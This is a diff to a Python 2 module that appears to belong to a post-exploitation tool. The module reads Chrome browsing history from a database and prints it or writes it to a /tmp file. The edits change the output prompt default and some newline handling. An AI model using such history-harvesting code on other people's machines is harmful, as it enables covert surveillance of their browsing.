@@ -13,14 +13,14 @@ class Module:
 
     def setup(self, module_view, output_view, successful):
         self.history_limit = module_view.prompt("History limit [ENTER for 10]: ")
-        self.output_file = module_view.prompt("Would you like to output to a file? [Y/n]").lower()
+        self.output_file = module_view.prompt("Would you like to output to a file? [y/N]").lower()
 
         if not self.history_limit:
             self.history_limit = 10
-        if not self.output_file or self.output_file == "y":
-            self.output_file = "/tmp/%s.txt" % str(uuid.uuid4()).replace("-", "")[0:12]
-        if self.output_file == "n":
+        if not self.output_file or self.output_file == "n":
             self.output_file = ""
+        elif self.output_file == "y":
+            self.output_file = "/tmp/%s.txt" % str(uuid.uuid4()).replace("-", "")[0:12]
 
         if not str(self.history_limit).isdigit():
             output_view.add("Invalid history limit.", "attention")
@@ -61,7 +61,7 @@ class Module:
                     with open(output_file, "a+") as out:
                         for item in statement[number:]:
                             out.write(str(item) + "\\n")
-                        out.write(" ")
+                        out.write("\\n")
                     
                 conn.close()
         except Exception as ex:
@@ -80,8 +80,8 @@ class Module:
                 number = %s * -1
                 
                 if not output_file:
-                    print MESSAGE_INFO + "Chrome history: "
                     print ""
+                    print MESSAGE_INFO + "Chrome history: "
                     
                     for item in statement[number:]:
                         print item
@@ -90,7 +90,6 @@ class Module:
                     with open(output_file, "a+") as out:
                         for item in statement[number:]:
                             out.write(str(item) + "\\n")
-                        out.write(" ")
                 
                 conn.close()
         except Exception as ex:
